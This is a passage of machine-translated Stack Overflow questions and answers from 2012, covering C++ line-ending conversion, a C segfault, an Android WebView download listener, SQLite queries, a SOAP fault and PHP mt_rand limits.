                out << "\r\n";
            }
        }
        out << line;
        first = false;
    }
    in.close();
    out.close();
    if (remove(argv[1]) != 0) {
        cerr << "Error deleting " << argv[1] << endl;
        return EXIT_FAILURE;
    }
    if (rename(tmp.c_str(), argv[1]) != 0) {
        cerr << "Error renaming " << tmp << " to " << argv[1] << endl;
        return EXIT_FAILURE;
    }
} 
```

正如其他人所说，已经有一些实用程序（包括像 Notepadd++ 这样的文本编辑器）可以为您进行换行符转换。因此，您不需要自己实现任何东西，除非您出于其他原因（您没有指定）这样做。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T06:03:03.140

我已经重新编辑了你的代码，它对我来说很好用..

希望这可以帮助 ！

```
#include <iostream>
#include <fstream>
#include <iostream>
#include<stdio.h>
using namespace std;

int main( )
{
    bool windows = false;
    char source[256];
    char destination[256]; // Allocate the max amount of space for the filenames.

    cout << "Please enter the name of the source file: ";
    cin >> source;

    ifstream fin( source, ios::binary );
    if ( !fin )          // Check to make sure the source file exists.
    {
        cerr << "File " << source << " not found!";
        return 1;
    }//endif

    cout << "Please enter the name of the destination file: ";
    cin >> destination;

    ifstream fest( destination );
    if ( fest )          // Check to see if the destination file already exists.
    {
        cout << "The file " << destination << " already exists!" << endl;
        cout << "If you would like to truncate the data, please enter 'Y', "
        << "otherwise enter 'N' to quit: ";
        char answer;
        cin >> answer;
        if ( answer == 'n' || answer == 'N' )
        {
            return 1;
        }
    }
    //clrscr();

    ofstream fout( destination);
    if ( !fout.good() )
    {
        cout << destination << "could not be opened!" << endl;
        return 1;
    }
    char ch = fin.get();
    while (!fin.eof())
    {
        if ( ch == '\r' ) 
        {                   
            windows = true;
        }
        if ( ch == '\n' && windows == false )    // If the file is in the Unix format..
        {
            // Don't do anything here
        }
        fout.put( ch );
        cout << ch; // For Debugging purpose
        ch = fin.get();
    }
    fout.close();
    fin.close();

    if ( windows == true )       // A little output for user-friendly-ness.
    {
        cout<<endl;
        cout << "The contents of " << source << " have been coppied to "
        << destination << " and converted to Unix format." << endl;
    }else{
        cout << "The contents of " << source << " have been coppied to "
        << destination << " and converted to Windows format." << endl;
    }//endif
    cout << "Enter any key to quit.." << endl;
    return 0;
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-09T06:13:46.657

不用担心在循环中检查窗口。只需检查回车。设置一个变量“carriage_return”。下一次迭代，如果 'carriage-return' 和 ch != linefeed，只需插入一个换行符。然后将carriage_return 变量重置为false。这是一个非常简单和基本的规则，不会让你出错。

```
bool carriage_return = false;
const char linefeed = '\n'; // Is it? I forget.
const char cr = '\r'; // I forget again. Too late to check.
char ch = fin.get();
if (ch == cr) carriage_return = true;
while (!fin.eof()){
  if (carriage_return) {  // Check if we already have a newline
    if (ch != linefeed) { // If we have a newline previously, we need a linefeed. If it's already there just leave it, if it isn't there put it in
      fout.put(linefeed);
    }
    if (ch != cr) carriage_return = false; // Reset the carriage-return flag *if* we don't have another carriage return. This handles multiple empty lines in an easy way for us.
  }

  fout.put(ch);
  ch = fin.get();
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-09T04:59:36.770

您是否确保以正确的格式读取数据并以正确的格式保存？

尝试使用不同的字符编码并只是“读取”它会导致非常糟糕的事情：|

然后，您还必须考虑需要完成的不同替换。

这可能有助于[链接](http://kb.iu.edu/data/acux.html)

# google-chrome-extension - 为 chrome 开发者工具构建覆盖工具

> ID：10069041
> 
> 赞同：7
> 
> 时间：2012-04-09T04:54:21.207
> 
> 标签：google-chrome-extension, google-chrome-devtools

我希望在 chrome 中扩展开发工具以支持“what-just-ran”。像这样 - 你点击一个录制按钮，在网页上做一些事情，然后停止录制。在开发工具中，它应该显示代码的运行部分——比如动态代码覆盖率。根据我在文档上阅读的内容，没有任何直接的方法。通过在每一行设置断点并查找执行的行，我一直在使用 dev-front-end（开发人员工具的源代码）进行破解，这就是我能走多远。这个项目是否可以使用当前的 chrome 扩展 API 甚至开发前端更改？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T13:03:39.077

**[JS 热图分析器斜线代码覆盖工具](http://heatfiler.qfox.nl/)**通过预处理 JavaScript 来做到这一点。

![Peter van der Zee 的 JS 热图](../Images/b7b3d3e638d3911dbd74ad0e260c6bbf.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-19T14:21:04.510

[![时间线截图](../Images/5efaafa4cf2771167700f83ce9bbd68c.png)](https://i.stack.imgur.com/U3APE.png)
[（来源：[google.com](https://developers.google.com/chrome-developer-tools/docs/timeline-files/timeline_slider_right.png)）]

时间轴包含所有这些以及渲染和加载信息。时间线数据通过[远程调试 API](https://developers.google.com/web/tools/chrome-devtools/remote-debugging/?utm_source=dcc&utm_medium=redirect&utm_campaign=2016q3)以及 DevTools 拥有的任何其他数据公开。

# xcode - 从滚动中禁用 UITableview 的子视图

> ID：10069045
> 
> 赞同：1
> 
> 时间：2012-04-09T04:55:03.383
> 
> 标签：xcode, uitableview, scroll, subview

(xCode 4.3.2, ARC, Storyboard) 我有一个主/细节项目，MasterViewController 像往常一样是一个 UITableViewController。它在顶部有一个导航栏，在底部有一个工具栏。我创建了一个自定义子视图，我以编程方式在`viewDidLoad`.

它加载得很好，并且就像我想要的那样在顶部，但是当用户滚动 tableview 时，子视图也会滚动。我需要子视图“粘”到底部。

![在此处输入图像描述](../Images/ad6d43d2e2889d4dff61880d03549a7a.png)

**这是我用来添加子视图的代码：**

```
 CGRect totalFrame = CGRectMake(0, 314, 320, 58);
    UIView *totalBG = [[UIView alloc] initWithFrame:totalFrame];
    totalBG.backgroundColor = [UIColor colorWithPatternImage:[UIImage imageNamed:@"totalBG.png"]];
    [self.view addSubview:totalBG];

    CGRect totalLabelFrame = CGRectMake(12, 12, 80, 40);
    totalLabelBG = [[UILabel alloc] initWithFrame:totalLabelFrame];
    totalLabelBG.backgroundColor = [UIColor clearColor];
    totalLabelBG.text = @"Total:";
    [totalLabelBG setFont:[UIFont boldSystemFontOfSize:22]];
    totalLabelBG.userInteractionEnabled = NO;
    totalLabelBG.textColor = [UIColor whiteColor];
    totalLabelBG.shadowColor = [UIColor blackColor];
    totalLabelBG.shadowOffset = CGSizeMake(0, 1);
    [totalBG addSubview:totalLabelBG]; 
```

我尝试将 userInteractionEnabled 设置为 NO`viewDidLoad`并检测触摸，并设置`totalLabelBG.center`属性，但均未成功。

我还阅读了很多关于禁用 web 视图滚动的线程，但没有发现任何相关内容。

我发现另一个 SOF 问题的答案可能有效，也可能无效，但用户没有解释答案。[“诀窍是调整 -layoutSubviews 内的‘不可滚动’子视图的框架。”](https://stackoverflow.com/questions/3011076/prevent-subview-from-scrolling-in-a-uiscrollview)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-09T12:59:02.830

我通过将子视图添加到`UINavigationController`容器中来达到预期的结果，如下所示：

```
[self.navigationController.view addSubview:totalBG]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-25T20:23:09.693

就像上面的答案一样。只需将该特定子视图添加到 UIScrollView 实例外部的任何子视图即可。如果它不应该滚动，那么将它放在滚动视图中是没有意义的。而是使滚动视图仅占据总计子视图顶部的高度

# c - C中段错误的原因

> ID：10069046
> 
> 赞同：0
> 
> 时间：2012-04-09T04:55:43.087
> 
> 标签：c, memory

在我的程序中，我遇到了段错误，我不确定原因或如何找出原因。任何帮助将不胜感激！

在代码中，我试图逐字阅读，但我需要跟踪行号。然后我试图创建一个链接列表，其中数据是单词和行号。

（有两个文件一起编译）

```
void main(int argc, char **argv){
    file = fopen(argv[1],"r");
    struct fileIndex *fIndex = NULL;
    delimiters = " .,;:!-";/*strtok chars to seperate*/
    int wCount = wordcount(file);/*number of words in file*/
    char **str[wCount+1];/*where the lines are being stored*/
    int j=0;
    while(!feof(file)){/*inserting lines*/
        fscanf(file, "%s", &str[j]);
        j++;
    }

    char *token, *cp;
    int i;
    int len;
    for(i = 0; str[i]; i++){/*checking to insert words*/
        len = strlen(*str[i]);
        cp = xerox(*str[i]);
        token = strtok(cp, delimiters);
        if(!present(fIndex, token)){
            insert(fIndex, i+1,token);
        }

        while(token!=NULL){
            token = strtok(NULL, delimiters);
            if(!present(fIndex, token)){
                insert(fIndex, i+1,token);
            }
        }
        i++;
    }
    fclose(file);
}

int strcmpigncase(char *s1, char *s2){/*checks words*/
    for(;*s1==*s2;s1++,s2++){
        if(*s1=='\0')
            return 0;
    }
    return tolower(*s2)-tolower(*s2);
}

present(struct fileIndex* fIndex, char *findIt){/*finds if word is in structure*/
    struct fileIndex* current = fIndex;
    while(current!=NULL){
        current = current -> next;
        if(strcmpigncase(current -> str, findIt)==0){
            return current -> lineNum;
        }
    }
    return 0;
}

void insert(struct fileIndex *head, int num, char *insert){/*inserts word into structure*/
    struct fileIndex* node = malloc(sizeof(struct fileIndex));

    node -> str = insert;
    node -> lineNum = num;

    node -> next = head;
    head = node;
}

#define IN_WORD 1
#define OUT_WORD 0

int wordcount(FILE *input)/*number of words in file*/
{
    FILE *open = input;
    int cur;         /* current character */
    int lc=0;      /* line count */
    int state=OUT_WORD;
    while ((cur=fgetc(open))!=EOF) {
        if (cur=='\n')
            lc++;
        if (!isspace(cur) && state == OUT_WORD) {
            state=IN_WORD;
        }
        else if (state==IN_WORD && isspace(cur)) {
            state=OUT_WORD;
        } 
    }
    return lc;
}

char *xerox(char *s){
    int i = strlen(s);
    char *buffer = (char *)(malloc(i+1));
    if(buffer == NULL)
        return NULL;

    char *t = buffer;
    while(*s!='\0'){
        *t=*s;
        s++; t++;
    }
    *t = '\0';
    return buffer;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T08:41:41.770

这段代码有相当高的问题率。我将只剖析前几行以给出一个想法：

> 无效的主要（int argc，char **argv）{

`main`应该返回`int`，不是`void`。可能不会导致您的问题，但也不正确。

```
file = fopen(argv[1],"r"); 
```

您确实需要`argc`在尝试使用之前检查`argv[1]`. 在没有参数的情况下调用程序很可能会导致问题。根据您调用它的方式，这可能是您的问题的原因。

```
struct fileIndex *fIndex = NULL; 
```

除非您包含了一些您没有显示的标题，否则它不应该编译 -`struct fileIndex`似乎没有被定义（似乎也没有在您发布的代码中看到的任何地方定义）。

```
delimiters = " .,;:!-";/*strtok chars to seperate*/
int wCount = wordcount(file);/*number of words in file*/ 
```

此 ( `wordcount`) 读取到文件末尾，但之后不倒回文件。

```
char **str[wCount+1];/*where the lines are being stored*/ 
```

根据您的描述，您根本不需要存储行（复数）。您可能想要的是读取*一行*，然后对其进行标记并将各个标记（连同行号）插入索引中，然后读取下一行。但是，从您所说的来看，没有真正的理由一次存储多个原始行。

```
int j=0;
while(!feof(file)){/*inserting lines*/ 
```

如上所述，您之前已阅读到文件末尾，并且从未倒回文件。因此，这个循环中的任何内容都不应该执行，因为一旦你到达这里，就`feof(file)`应该 return `true`。当/如果你处理好它，这个循环将无法正常工作——事实上，表单的循环`while (!feof(file))`本质上总是错误的。在这种情况下，你想检查你的结果，`fscanf`比如：

```
while (1 == fscanf(file, "%1023s", line)) 
```

...因此您在尝试读取失败时退出循环。

```
 fscanf(file, "%s", &str[j]); 
```

你在这里所拥有的基本上等同于臭名昭著的`gets`——你没有做任何事情来限制输入到缓冲区的大小。如上所示，您通常希望使用`%[some_number]s`，其中`some_number`比您正在使用的缓冲区的大小小一（当然，要做到这一点，您确实需要一个缓冲区，而您也没有）。

您也没有做任何事情来将行数限制为您分配的空间量（但是，与单独的行一样，您没有分配任何空间）。但是，我几乎不愿提及这一点，因为（如上所述）从您的描述来看，您似乎没有任何理由存储多于一行。

您的代码还泄漏了它分配的所有内存——您有对 的调用`malloc`，但对任何地方都没有一次调用`free`。

实际上，上面的一些建议（至少或多或少）是错误的。它正在研究如何修复单个代码行，但实际上您可能希望总体上对代码的结构有所不同。而不是读取文件两次，一次计算单词，然后再次读取以索引单词，您可能希望一次读取一行（可能使用`fgets`，然后将行分成单词，并在插入时计算每个单词将它添加到您的索引中。哦，您几乎肯定也*不想*使用链表作为索引。树或哈希表对这项工作更有意义。

我也不同意在此代码上使用调试器的建议。调试器不太可能导致明显更好的代码——它可能会帮助您找到一些本地化问题，但不太可能导致明显更好的程序。相反，我建议您将一支铅笔和一张纸作为您真正需要使用的工具。我相信您当前的问题主要是因为没有充分考虑问题以真正理解实现目标所需的步骤，并且调试器不太可能帮助找到该问题的答案。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T05:12:39.460

如果你手边没有一个好的调试器，一个好的后备方法是`printf`在代码的各个步骤中简单地添加一些语句，这样你就可以看到它在崩溃之前有多远。

在这段代码中：

```
char **str[wCount+1];/*where the lines are being stored*/
int j=0;
while(!feof(file)){/*inserting lines*/
   fscanf(file, "%s", &str[j]);
   j++;
} 
```

`str``char *`是一个指向s的指针数组。在您的循环中，您正在将每条输入读入其中的一个插槽。有几个问题。

1.  `*`我认为s 与s的数量有误`&`（我通常不会使用那么多级别的指针间接进行编程，以避免不得不如此努力地考虑它们;-)。 `&str[j]`是该数组元素的地址，但该数组元素是指向指针的指针；现在你有一个指向指针的指针。如果你有`char *str[wCount+1]`，并读到`str[j]`，我认为它可能会匹配。（而且我用`fscanf`的不多，所以也许有人可以确认如何最好地使用它。）

2.  更明显的是，您实际上并没有为字符串数据分配任何内存。您只是将它分配给数组本身。您可能希望为每个分配一个固定的金额（您可以在每次`fscanf`调用之前在循环中执行此操作）。请记住，您`fscanf`实际上可能会读取*超过*该固定大小的内容，从而导致另一个内存错误。同样，解决这个问题需要使用专家`fscanf`。

希望这有助于开始。如果`printf`建议在失败的代码中找到更具体的点，请将其添加到问题中。

# asp.net - 在 asp.net 中发布网站会更改母版页中控件的间距/大小

> ID：10069049
> 
> 赞同：0
> 
> 时间：2012-04-09T04:56:05.943
> 
> 标签：asp.net, master-pages

我在 IIS 上发布了我的 asp.net 网站，并且更改了母版页控件的格式。此外，将页面放在 IIS 上后，我也无法访问母版页上的子菜单。我该如何解决？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:11:05.987

您是否在已发布文件夹中包含了所有必需的 CSS？您是否在代码中以正确的方式链接 CSS 文件，或者当发布目录下的目录结构发生更改时链接中断？发布完整的详细信息以获得可靠的答案。

# android - 在 WebView 中下载文件

> ID：10069050
> 
> 赞同：90
> 
> 时间：2012-04-09T04:56:08.220
> 
> 标签：android, webview, download, attachment

我的 Android 应用程序中有一个 webview。当用户转到 webview 并单击链接以下载文件时，没有任何反应。

```
URL = "my url";
mWebView = (WebView) findViewById(R.id.webview);
mWebView.setWebViewClient(new HelloWebViewClient());
mWebView.getSettings().setDefaultZoom(ZoomDensity.FAR);
mWebView.loadUrl(URL);
Log.v("TheURL", URL); 
```

如何在 webview 中启用下载？如果我禁用 webview 并启用从应用程序在浏览器上加载 URL 的意图，则下载将无缝运行。

```
String url = "my url";
Intent i = new Intent(Intent.ACTION_VIEW);
i.setData(Uri.parse(url));
startActivity(i); 
```

有人可以帮我吗？页面加载没有问题，但 HTML 页面中图像文件的链接不起作用...

* * *

## 回答 #1

> 赞同：129
> 
> 时间：2012-04-09T05:25:07.887

你有没有尝试过？

```
mWebView.setDownloadListener(new DownloadListener() {
    public void onDownloadStart(String url, String userAgent,
                String contentDisposition, String mimetype,
                long contentLength) {
        Intent i = new Intent(Intent.ACTION_VIEW);
        i.setData(Uri.parse(url));
        startActivity(i);
    }
}); 
```

示例链接：[Webview 文件下载](https://androidride.com/android-webview-example-tutorial-kotlin-java-download-source-code/#android%20webview%20download%20file%20example)- 谢谢@c49

* * *

## 回答 #2

> 赞同：61
> 
> 时间：2015-06-30T02:58:51.773

试试这个。在浏览了很多帖子和论坛后，我发现了这一点。

```
mWebView.setDownloadListener(new DownloadListener() {       

    @Override
    public void onDownloadStart(String url, String userAgent,
                                    String contentDisposition, String mimetype,
                                    long contentLength) {
            DownloadManager.Request request = new DownloadManager.Request(
                    Uri.parse(url));

            request.allowScanningByMediaScanner();
            request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED); //Notify client once download is completed!
            request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "Name of your downloadble file goes here, example: Mathematics II ");
            DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
            dm.enqueue(request);
            Toast.makeText(getApplicationContext(), "Downloading File", //To notify the Client that the file is being downloaded
                    Toast.LENGTH_LONG).show();

        }
    }); 
```

不要忘记授予此权限！这个非常重要！将此添加到您的清单文件中（AndroidManifest.xml 文件）

```
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />        <!-- for your file, say a pdf to work --> 
```

希望这可以帮助。干杯:)

* * *

## 回答 #3

> 赞同：26
> 
> 时间：2016-12-31T15:54:11.957

```
 mwebView.setDownloadListener(new DownloadListener()
   {

  @Override  

   public void onDownloadStart(String url, String userAgent,
        String contentDisposition, String mimeType,
        long contentLength) {

    DownloadManager.Request request = new DownloadManager.Request(
            Uri.parse(url));

    request.setMimeType(mimeType);

    String cookies = CookieManager.getInstance().getCookie(url);

    request.addRequestHeader("cookie", cookies);

    request.addRequestHeader("User-Agent", userAgent);

    request.setDescription("Downloading file...");

    request.setTitle(URLUtil.guessFileName(url, contentDisposition,
            mimeType));

    request.allowScanningByMediaScanner();

    request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
    request.setDestinationInExternalPublicDir(
            Environment.DIRECTORY_DOWNLOADS, URLUtil.guessFileName(
                    url, contentDisposition, mimeType));
    DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
    dm.enqueue(request);
    Toast.makeText(getApplicationContext(), "Downloading File",
            Toast.LENGTH_LONG).show();
}}); 
```

* * *

## 回答 #4

> 赞同：16
> 
> 时间：2014-08-05T08:09:57.797

尝试使用下载管理器，它可以帮助您下​​载所需的所有内容并节省您的时间。

检查那些选项：

选项 1 ->

```
 mWebView.setDownloadListener(new DownloadListener() {
        public void onDownloadStart(String url, String userAgent,
                String contentDisposition, String mimetype,
                long contentLength) {
 Request request = new Request(
                            Uri.parse(url));
                    request.allowScanningByMediaScanner();
                    request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
                    request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "download"); 
                    DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
                    dm.enqueue(request);        

        }
    }); 
```

选项 2 ->

```
if(mWebview.getUrl().contains(".mp3") {
 Request request = new Request(
                        Uri.parse(url));
                request.allowScanningByMediaScanner();
                request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
                request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "download"); 
// You can change the name of the downloads, by changing "download" to everything you want, such as the mWebview title...
                DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
                dm.enqueue(request);        

    } 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2020-11-25T11:23:27.547

```
webView.setDownloadListener(new DownloadListener()
        {
            @Override
            public void onDownloadStart(String url, String userAgent,
                                        String contentDisposition, String mimeType,
                                        long contentLength) {
                DownloadManager.Request request = new DownloadManager.Request(
                        Uri.parse(url));
                request.setMimeType(mimeType);
                String cookies = CookieManager.getInstance().getCookie(url);
                request.addRequestHeader("cookie", cookies);
                request.addRequestHeader("User-Agent", userAgent);
                request.setDescription("Downloading File...");
                request.setTitle(URLUtil.guessFileName(url, contentDisposition, mimeType));
                request.allowScanningByMediaScanner();
                request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
                request.setDestinationInExternalPublicDir(
                        Environment.DIRECTORY_DOWNLOADS, URLUtil.guessFileName(
                                url, contentDisposition, mimeType));
                DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
                dm.enqueue(request);
                Toast.makeText(getApplicationContext(), "Downloading File", Toast.LENGTH_LONG).show();
            }}); 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2020-12-10T20:28:27.430

如果您**不想使用下载管理器**，则可以使用此代码

```
webView.setDownloadListener(new DownloadListener() {

            @Override
            public void onDownloadStart(String url, String userAgent, String contentDisposition
                    , String mimetype, long contentLength) {

                String fileName = URLUtil.guessFileName(url, contentDisposition, mimetype);

                try {
                    String address = Environment.getExternalStorageDirectory().getAbsolutePath() + "/"
                            + Environment.DIRECTORY_DOWNLOADS + "/" +
                            fileName;
                    File file = new File(address);
                    boolean a = file.createNewFile();

                    URL link = new URL(url);
                    downloadFile(link, address);

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });

 public void downloadFile(URL url, String outputFileName) throws IOException {

        try (InputStream in = url.openStream();
             ReadableByteChannel rbc = Channels.newChannel(in);
             FileOutputStream fos = new FileOutputStream(outputFileName)) {
            fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
        }
           // do your work here

    } 
```

这将下载手机存储中下载文件夹中的文件。如果你想在后台下载它，你可以使用线程（使用 thread.alive() 和计时器类来知道下载是否完成）。这在我们下载小文件时很有用，因为您可以在下载后立即执行下一个任务。

# java - 如果日期不在Android中的该表中，如何将日期插入用户输入的表中

> ID：10069051
> 
> 赞同：0
> 
> 时间：2012-04-09T04:56:27.677
> 
> 标签：java, android, sqlite, date

我从用户那里获取输入作为日期，我想检查该日期是否在表中，然后获取与该日期对应的数据，否则将该日期插入该表中。我正在使用以下代码并在选择查询中遇到问题。我的代码如下：

```
package com.foursquaregame.in;

import java.sql.Date;
import java.text.ParseException;
import java.text.SimpleDateFormat;

import android.app.Activity;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextUtils;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

public class Astro_talk extends Activity{
    EditText dob;
    Button submit;
    SQLiteDatabase db_sunshine=null;
    String Data="";
    String Data1="";
    String TableName="tb_astro";
    String dob_var;
    String date_var;
    String quote;
    public void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        setContentView(R.layout.astro_talk);
        //quote="Don't worry, Be happy";
        dob=(EditText)findViewById(R.id.dob);
        final SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd");
        submit=(Button)findViewById(R.id.submit);
        submit.setOnClickListener(new OnClickListener() {

            public void onClick(View v) {
                java.util.Date dateObject;

                System.out.println("submit data");
                dob_var=dob.getText().toString();
                try {
                    dateObject = sdf.parse(dob_var);
                    date_var = new SimpleDateFormat("yyyy/MM/dd").format(dateObject);

                } catch (ParseException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }

                System.out.println(dob_var);
                 try
                    {
                     db_sunshine=Astro_talk.this.openOrCreateDatabase("db_hellosunshine", MODE_PRIVATE, null);
                     db_sunshine.execSQL("CREATE TABLE IF NOT EXISTS "+ TableName + " (d_o_b NUMERIC,astro_quote DATE))");
                     Cursor c=db_sunshine.rawQuery("SELECT astro_quote FROM "+ TableName +"WHERE d_o_b='"+ date_var +"'" , null);
                     System.out.println("query executed");
                        int column1=c.getColumnIndex("d_o_b");
                        int column2=c.getColumnIndex("astro_quote");
                        c.moveToFirst();
                        if(c!=null)
                        {   

                            {
                                String date=c.getString(column1);
                                String astro =c.getString(column2);
                                Data=Data+date+"\n";
                                Data1=Data1+astro+"\n";
                                System.out.println("name"+date+" score"+astro);
                            }while(c.moveToNext());
                        }
                        if(Data.equals(dob_var)){
                            RelativeLayout rel_astro=(RelativeLayout)findViewById(R.id.rel_astro);
                            TextView tv_astro=(TextView)findViewById(R.id.tv_astro);
                            tv_astro.setText(Data);

                            setContentView(rel_astro);
                        }
                        else{
                            db_sunshine.execSQL("INSERT INTO "+TableName+"(d_o_b,astro_quote)"+" VALUES ('"+dob_var+"','"+quote+"');");
                            Toast customToast = new Toast(getBaseContext());
                            customToast = Toast.makeText(getBaseContext(), "Your quote is submit", Toast.LENGTH_SHORT);
                            customToast.setGravity(Gravity.CENTER_HORIZONTAL, 0, 0);
                            customToast.show();

                            Intent newIntent = new Intent(Astro_talk.this,selectoption.class);

                            startActivity(newIntent);
                            finishActivity(0);

                        }

                    }catch(Exception ex)
                    {
                        Log.e("ERROR","ERROR" ,ex);
                    }
                    finally
                    {
                        if(db_sunshine!=null)
                            db_sunshine.close();
                    }
            }
        });
    }

} 
```

请告诉我我在哪里做错了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T07:39:39.240

尝试使用：

```
 Cursor c=db_sunshine.rawQuery("SELECT astro_quote FROM "+ TableName +" WHERE d_o_b="+ date_var, null); 
```

我不确定，这些是唯一的问题，但这可能是因为您没有在查询中的 WHERE 之前添加空格字符（我已经在上面添加了一个）。我认为您的 d_o_b 是数字，你不不需要在查询中的 date_var 前后使用“'”。

**编辑 ：**

从您的代码看来，您正在尝试在创建表后立即访问它。因此表中没有数据，因此，您将获得空游标。当您尝试从该游标访问数据时，您会遇到异常。

首先用数据填充表格。然后尝试获取它。

所以基本上你需要做的是-

```
 db_sunshine=Astro_talk.this.openOrCreateDatabase("db_hellosunshine", MODE_PRIVATE, null);
 db_sunshine.execSQL("CREATE TABLE IF NOT EXISTS "+ TableName + " (d_o_b NUMERIC,astro_quote DATE))");

 // call a function to add data to table ( you will have to add data here to the table created just now )

 Cursor c=db_sunshine.rawQuery("SELECT astro_quote FROM "+ TableName +" WHERE d_o_b="+ date_var, null);
 if(c.getCount()>0)
 {
    // cursor contains data ( which can never be a option for your case )
 }             
 else
 {
   // empty cursor
 } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T05:13:49.957

```
 Cursor c=db_sunshine.rawQuery("SELECT astro_quote FROM "+ TableName +"WHERE d_o_b='"+ date_var +"'" , null);
                 System.out.println("query executed");
                    int column1=c.getColumnIndex("d_o_b");
                    int column2=c.getColumnIndex("astro_quote");
                    c.moveToFirst();
                    if(c!=null)
                    {   

                        {
                            String date=c.getString(column1);
                            String astro =c.getString(column2);
                            Data=Data+date+"\n";
                            Data1=Data1+astro+"\n";
                            System.out.println("name"+date+" score"+astro);
                        }while(c.moveToNext());
                    } 
```

在这里，您正在查询一列，但尝试获取两列您只能获得一个日期，即 int column1=c.getColumnIndex("astro_quote");

字符串 astro =c.getString(column1);

# iphone - WSDL 连接引发 ADBException

> ID：10069052
> 
> 赞同：-1
> 
> 时间：2012-04-09T04:56:44.120
> 
> 标签：iphone, objective-c, xcode, wsdl, xmlhttprequest

在我的应用程序中，我正在使用 WSDl webservice。并尝试调用 webservice 方法。在该请求中成功发送并获得响应。但是当我使用以下方法获取该响应时：

```
 // Called when the connection has finished loading.
- (void)connectionDidFinishLoading:(NSURLConnection *)connection {
    NSError* error;
    if(self.logging == YES) {
        NSString* response = [[NSString alloc] initWithData: self.receivedData encoding: NSUTF8StringEncoding];
        NSLog(@"response=%@", response);
        [response release];
    } 
```

它给出了以下异常。我的 NSLog 语句显示了以下详细信息：

```
response=<?xml version='1.0' encoding='utf-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><soapenv:Fault><faultcode>soapenv:Server</faultcode><faultstring>org.apache.axis2.databinding.ADBException: Unexpected subelement {http://services.webservices.sparta.com}sSessionId</faultstring><detail /></soapenv:Fault></soapenv:Body></soapenv:Envelope> 
```

请建议我解决此问题的方法。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T04:43:15.820

从问题描述中我们无法准确找出问题所在。

但是从您的日志中，我可以给您一些建议来检查您的代码：

```
<soapenv:Fault><faultcode>soapenv:Server</faultcode><faultstring> 
```

1) 您可能将错误数量的参数传递给 Web 服务。

2）参数`data type`可能`not be matching`。例如，您正在传递`string`服务器接受`integer`的位置，反之亦然。

3) 或`web-service having some problem`。

您还可以搜索[org.apache.axis2.databinding.ADBException: Unexpected subelement](https://www.google.co.in/search?q=org.apache.axis2.databinding.ADBException%3a%20Unexpected%20subelement&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla%3aen-US%3aofficial&client=firefox-a)。有许多有用的链接可以帮助您确定问题出在您的网络服务中还是在您的 iphone 编码中。

# php - 函数 mt_rand 的最大取值范围？

> ID：10069054
> 
> 赞同：3
> 
> 时间：2012-04-09T04:57:19.263
> 
> 标签：php, function, random

函数中传递的值是否有最大范围`mt_rand()`？它有最大的“顶级”数字吗？

上述限制是否取决于平台？

的速度是否`mt_rand()`取决于传入的范围？

换句话说，会`mt_rand(0,100000000000000000000000000000000000000000000000)`工作吗？

抱歉，几个问题合二为一。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T05:05:34.363

> [返回一个介于 0 和 mt_getrandmax() 之间的伪随机值](http://php.net/manual/en/function.mt-rand.php)

你为什么不直接打电话`mt_getrandmax`查一下？[一位评论者写道：](http://www.php.net/manual/en/function.mt-getrandmax.php#105347)

> 在 32 位和 64 位系统（OS X 和 Linux）上，mt_getrandmax() 为我返回 2147483647，即 ~2^31。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T05:05:09.980

是的，是的，我想是这样，而且可能不是。在深入了解之前先[查看文档；](http://php.net/manual/en/function.mt-rand.php)它可以返回的最大值取决于运行脚本的系统。查看[mt_getrandmax() 了解更多信息](http://www.php.net/manual/en/function.mt-getrandmax.php)，但根据我的阅读，2147483647 (~2^31) 是 32 位和 64 位系统上的最大值，但我从未亲自测试过。

